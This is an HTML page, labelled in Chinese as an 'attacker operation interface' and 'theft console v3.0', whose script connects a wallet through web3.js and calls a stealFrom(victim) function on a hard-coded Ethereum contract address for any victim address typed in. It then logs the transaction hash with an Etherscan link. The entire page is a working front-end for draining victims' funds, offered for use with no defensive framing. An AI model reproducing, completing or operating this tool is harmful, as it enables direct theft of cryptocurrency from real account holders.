<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>盜取控制台 v3.0</title>
<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script></head>
<body style="font-family:monospace;padding:30px;">
  <h2>🛠️ 攻擊者操作介面 <span style="float:right;color:gray;">v3.0</span></h2>
  <div>合約地址：<b>0xFbe9c4748A267562f723C67db673943F901533D6</b></div><br>
  <input id="victim" placeholder="受害者地址" style="width:350px;">
  <button onclick="steal()">執行盜取</button><br><br>
  <pre id="log">⚙️ 等待操作…</pre>
  <script>
    const contractAddr = "0xFbe9c4748A267562f723C67db673943F901533D6";
    const abi = [{"name":"stealFrom","type":"function","inputs":[{"name":"victim","type":"address"}],"outputs":[],"stateMutability":"nonpayable"}];
    async function steal() {
      const web3 = new Web3(window.ethereum);
      await ethereum.request({ method: 'eth_requestAccounts' });
      const accounts = await web3.eth.getAccounts();
      const me = accounts[0];
      const victim = document.getElementById("victim").value;
      document.getElementById("log").innerText = `👤 目前帳號：${me}`;
      if (!victim || victim.toLowerCase() === me.toLowerCase()) {
        document.getElementById("log").innerText += "\n❌ 錯誤：不能盜取自己地址";
        return;
      }
      const contract = new web3.eth.Contract(abi, contractAddr);
      document.getElementById("log").innerText += `\n🚀 呼叫 stealFrom(${victim})...`;
      try {
        const tx = await contract.methods.stealFrom(victim).send({from: me});
        document.getElementById("log").innerText += `\n✅ 成功！TX Hash: https://etherscan.io/tx/${tx.transactionHash}`;
      } catch (e) {
        document.getElementById("log").innerText += `\n❌ 失敗：` + (e.message || e);
      }
    }
  </script>
</body>
</html>